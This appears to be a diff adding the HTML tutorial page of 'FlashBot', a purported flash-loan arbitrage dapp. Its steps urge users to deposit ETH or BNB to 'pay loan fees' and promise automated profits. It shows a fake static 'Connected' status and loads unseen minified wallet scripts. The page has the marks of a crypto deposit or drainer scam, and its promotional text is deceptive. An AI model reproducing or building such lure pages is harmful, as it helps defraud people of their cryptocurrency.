@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	
+	<title>FlashBOT Arbitrage Tutorial</title>
+
+	<link rel="stylesheet" href="./assets/css/styles.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+
+	<script>var site = "defiexploit.github.io";</script>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<script defer data-domain="defiexploit.github.io" src="https://plausible.io/js/plausible.js"></script>
+	</head>
+
+<body class="body" ng-app="myApp" ng-controller="myCtrl">
+	
+	<div id="main">
+		<div class="topnav">
+	
+		<div id="mySidenav" class="sidenav">
+			<ul id="menu" class="darking-menu" style="position: relative; padding:15px;display: grid;height: 150px;">
+			  <a href="javascript:void(0)" style="margin-top:0px" class="closebtn" onclick="closeNav()">&times;</a>
+			  
+			  <li style="margin-top: -18px;"><a  style="font-size: 12px;text-align: left;">Welcome to Flash<strong>Bot</strong>!</a></li>
+			  <br/><br/>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="index.html" id="site">Home</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="list.html" id="site">Token List</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="bounty.html" id="site">Bounty Program</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="FAQ.html" id="site">FAQ</a></li>
+			  
+			  <br/><br/>
+	
+			  <div style="display: inline; place-self: center;"><a style="font-size: 14px;" target="_blank" href="https://github.com/defiexploit/defiexploit.github.io">Github</a>
+				<a style="font-size: 14px;" target="_blank" href="https://fc21.ifca.ai/papers/158.pdf">Docs</a>
+				<a style="font-size: 14px;" target="_blank" href="https://news.google.com/search?for=flash+loan+attack">News</a></div>
+		  </ul>  
+		</div>
+	
+			<a href="javascript:void(0);" style="padding-top: 18px; padding-left: 0px;" class="icon" onclick="openNav()">
+				<i class="fa fa-bars"></i>
+			</a>
+
+			<a class="darking-logo" href="index.html" id="site" style="padding: 11px 0px;">
+				<img src="assets/image/logo.png" id="logo" width="30px" height="30px" style="float: none;">
+				<a  style="font-size: 20px;" href="index.html" id="site"><strong>Flash</strong>Bot<a style="font-size: 10px;margin-left: -25px;">v2</a></a>
+				<a  style="font-size: 12px; margin-top: 14px; padding:5px 10px; border-radius: 15px;font-weight: 900 ; background: #1a70e1;" href="tutorial.html">Tutorial</a>
+			</a>
+			
+			<ul id="menu" style="transform: translate(0%, 0%); display: contents;" class="darking-menu">
+				<li><a  style="font-size: 14px; line-height: 22px; margin-left: 50px;" href="index.html" id="site">Bot</a></li>
+				<li><a  style="font-size: 14px; line-height: 22px;" href="pool.html" id="site">Pool</a></li>
+				<li><a  style="font-size: 14px; line-height: 22px;" href="referral.html" id="site">Affiliate</a></li>
+			</ul>
+	
+			<div class="topnav-right">
+			<button class="button-info" id="info" style="margin-top: 10px;border-radius: 50px; background: #191b1f; padding: 5px 15px;"><i class="fa fa-user-circle-o"></i> <div style="display: inline;">{{toplen}}...{{endlen}}</div></button>
+	
+			<div id="myModal" class="modal">
+				<div class="modal-content" style="width: 600px; height: 250px;">
+				  <span class="close">&times;</span>
+				  <h1 style="font-size: 20px; margin-top: 50px;padding: 25px; padding-top: 40px; padding-bottom: 10px; font-weight: 800;text-align: left;">Your Wallet</h1>
+				  <hr class="new1"/>
+				  <button style="margin: 15px 20px; width: auto; background: #191b1f;padding: 18px 10px;"><div style="font-size: 20px;">{{account.address}}</div></button>
+				 <div style="padding: 0px 20%;width: 100%;"> 
+				  <a href="{{scan}}address/{{account.address}}" style="font-size: 18px;">Check on {{idscan}}</a>
+				  <a onclick="copyRef()" style="font-size: 18px;">Copy Address</a>
+				  <a id="input" style="font-size: 0px; height: 0px;">{{account.address}}</a>
+				</div>
+				</div>
+			  </div>
+	
+			  <script>
+				function copyRef(id)
+				{
+				var r = document.createRange();
+				r.selectNode(document.getElementById("input"));
+				window.getSelection().removeAllRanges();
+				window.getSelection().addRange(r);
+				document.execCommand('copy');
+				window.getSelection().removeAllRanges();
+				return alert("Address copied successfully!");
+				}
+	
+				var modal2 = document.getElementById("myModal");
+				var btn2 = document.getElementById("info");
+				var span2 = document.getElementsByClassName("close")[0];
+	
+				btn2.onclick = function() {
+					modal2.style.display = "block";
+				}
+				span2.onclick = function() {
+				modal2.style.display = "none";
+				}
+				window.onclick = function(event) {
+					if (event.target == modal2) {
+					modal2.style.display = "none";
+					}
+				}
+			  </script>
+			</div>
+			
+		</div>
+	</div>
+	
+	<script>
+		function myFunction() {
+		  var x = document.getElementById("myLinks");
+		  if (x.style.display === "block") {
+			x.style.display = "none";
+		  } else {
+			x.style.display = "block";
+		  }
+		}
+	</script>
+	
+		<div class="space10"></div>
+
+	<iframe width="620" height="345" style="border:0px"
+	src="https://www.youtube.com/embed/t5PLdkp-3R8">
+	</iframe>
+
+	<form id="regForm" action="index.html">
+		<div class="tab">
+			<a style="font-size: 22px; color: white;">1. Choose a Token to Start arbitrage</a><br/>
+			<div class="space25"></div>
+				<a style="font-size: 12px; color: white;">The DAPP will automatically check for possible arbitrage opportunities for the selected token on the  Decentralized exchanges (on ETH or BSC chain)</a>
+		</div>
+		<div class="tab">
+			<a style="font-size: 22px; color: white;">2. Get the Loan for the Arbitrage</a><br/><br/>
+			<div class="space10"></div>
+				<a style="font-size: 12px; color: white;">Once  the opportunity has been found, you can get  Flash Loan from AAVE, Multiplier-Finance, or from PancakeSwap/Uniswap (thanks to flash swap). This is done for you in the dapp, just select the loan amount.</a>
+		</div>
+		<div class="tab">
+			<a style="font-size: 22px; color: white;">3. Deposit ETH or BNB</a><br/><br/>
+			<div class="space10"></div>
+				<a style="font-size: 12px; color: white;">Now you need pay the fees of the Loan to start arbitrage clicking the deposit Button.</a>
+		</div>
+		<div class="tab">
+			<a style="font-size: 22px; color: white;">4. Run arbitrage script</a><br/><br/>
+			<div class="space10"></div>
+				<a style="font-size: 12px; color: white;">The bot will execute the arbitrage trades, repay the Flash Loan amount and will split the profit between you and the devs (only 0.3% of the profit will go to devs).</a>
+		</div>
+		<div style="text-align:center; margin-top:40px; width: 100%;">
+		  <span class="step"></span>
+		  <span class="step"></span>
+		  <span class="step"></span>
+		  <span class="step"></span>
+		</div>
+		<div class="space50"></div>
+		<div style="width: 100%; padding-right: 25%; padding-left: 25%;">
+			<button type="button" id="nextBtn" onclick="nextPrev(1)" style="width: 50%; padding: 15px 6px;">Next Step</button>
+			<button type="button" id="prevBtn" onclick="nextPrev(-1)" style="width: 50%; padding: 15px 6px;">Go Back</button>
+		</div>
+	  </form>
+
+	  <script>
+		var currentTab = 0; // Current tab is set to be the first tab (0)
+		showTab(currentTab); // Display the current tab
+		
+		function showTab(n) {
+		  // This function will display the specified tab of the form...
+		  var x = document.getElementsByClassName("tab");
+		  x[n].style.display = "block";
+		  //... and fix the Previous/Next buttons:
+		  if (n == 0) {
+			document.getElementById("prevBtn").style.display = "none";
+		  } else {
+			document.getElementById("prevBtn").style.display = "inline";
+		  }
+		  if (n == (x.length - 1)) {
+			document.getElementById("nextBtn").innerHTML = "Start now";
+		  } else {
+			document.getElementById("nextBtn").innerHTML = "Next";
+		  }
+		  //... and run a function that will display the correct step indicator:
+		  fixStepIndicator(n)
+		}
+		
+		function nextPrev(n) {
+		  // This function will figure out which tab to display
+		  var x = document.getElementsByClassName("tab");
+		  // Exit the function if any field in the current tab is invalid:
+		  if (n == 1 && !validateForm()) return false;
+		  // Hide the current tab:
+		  x[currentTab].style.display = "none";
+		  // Increase or decrease the current tab by 1:
+		  currentTab = currentTab + n;
+		  // if you have reached the end of the form...
+		  if (currentTab >= x.length) {
+			// ... the form gets submitted:
+			document.getElementById("regForm").submit();
+			return false;
+		  }
+		  // Otherwise, display the correct tab:
+		  showTab(currentTab);
+		}
+		
+		function validateForm() {
+		  // This function deals with validation of the form fields
+		  var x, y, i, valid = true;
+		  x = document.getElementsByClassName("tab");
+		  y = x[currentTab].getElementsByTagName("input");
+		  // A loop that checks every input field in the current tab:
+		  for (i = 0; i < y.length; i++) {
+			// If a field is empty...
+			if (y[i].value == "") {
+			  // add an "invalid" class to the field:
+			  y[i].className += " invalid";
+			  // and set the current valid status to false
+			  valid = false;
+			}
+		  }
+		  // If the valid status is true, mark the step as finished and valid:
+		  if (valid) {
+			document.getElementsByClassName("step")[currentTab].className += " finish";
+		  }
+		  return valid; // return the valid status
+		}
+		
+		function fixStepIndicator(n) {
+		  // This function removes the "active" class of all steps...
+		  var i, x = document.getElementsByClassName("step");
+		  for (i = 0; i < x.length; i++) {
+			x[i].className = x[i].className.replace(" active", "");
+		  }
+		  //... and adds the "active" class on the current step:
+		  x[n].className += " active";
+		}
+		</script>
+		<style>
+			* {
+			  box-sizing: border-box;
+			}
+			
+			body {
+			  background-color: transparent;
+			}
+			
+			#regForm {
+			  background-color: transparent;
+			  margin: 50px auto;
+			  padding: 40px;
+			  width: 70%;
+			  min-width: 500px;
+			}
+			
+			h1 {
+			  text-align: center;  
+			}
+			
+			input {
+			  padding: 10px;
+			  width: 100%;
+			  font-size: 17px;
+			  border: 0px solid #aaaaaa;
+			}
+			
+			/* Mark input boxes that gets an error on validation: */
+			input.invalid {
+			  background-color: #ffdddd;
+			}
+			
+			/* Hide all steps by default: */
+			.tab {
+			  display: none;
+			}
+			
+			#prevBtn {
+			  background-color: transparent;
+			  font-size: 12px;
+			}
+			
+			.step {
+			  height: 15px;
+			  width: 15px;
+			  margin: 0 2px;
+			  background-color: #bbbbbb;
+			  border: none;  
+			  border-radius: 50%;
+			  display: inline-block;
+			  opacity: 0.5;
+			}
+			
+			.step.active {
+			  opacity: 1;
+			  padding: 3px;
+			  height: 15px;
+			  width: 15px;
+			  margin: 0 2px;
+			  background-color: #bbbbbb;
+			  border: 0px;  
+			  border-radius: 50%;
+			  display: inline-block;
+			}
+			
+			/* Mark the steps that are finished and valid: */
+			.step.finish {
+			  background-color: #1a70e1;
+			}
+			</style>
+
+<div class="space10"></div>
+
+<ul class="darking-menu">
+	<div class="tooltip" style="border-bottom: 0px dotted #000;position: relative;">
+		<a class="darking-menu" style="font-size: 12px;display: contents;" ><p>WebSocket: <a style="color: rgb(85, 170, 0);font-size: 12px;display: contents;"><i class="fa fa-circle"></i> Connected</a><span class="tooltiptext">Our WebSocket is correctly connected to the Server.</span></p></a>
+	</div></br>
+	<a class="darking-menu" style="font-size: 12px;" ><p>© FlashBot 2021</p></a>
+</ul>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.5/web3.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
+	<script src="./assets/js/addr.min.js?v=2"></script>
+	<script src="./assets/js/chain.min.js?v=2"></script>
+	<script src="./assets/js/script.min.js?v=4"></script>
+</body>
+
+</html>
